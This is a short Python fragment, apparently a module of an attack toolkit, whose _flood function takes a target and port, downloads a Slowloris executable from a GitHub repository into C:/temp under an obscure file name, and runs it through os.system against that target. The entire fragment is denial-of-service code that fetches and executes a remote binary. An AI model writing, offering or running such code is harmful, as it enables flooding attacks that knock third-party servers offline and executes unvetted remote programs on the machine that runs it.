import wget,os

def _flood(alvo,porta):
    wget.download('https://github.com/ReddyyZ/RedNet/blob/master/modules/slowloris.exe?raw=true', out='C:/temp/0x32546777.exe')
    os.system('C:/temp/0x32546777.exe {} {}'.format(alvo,porta))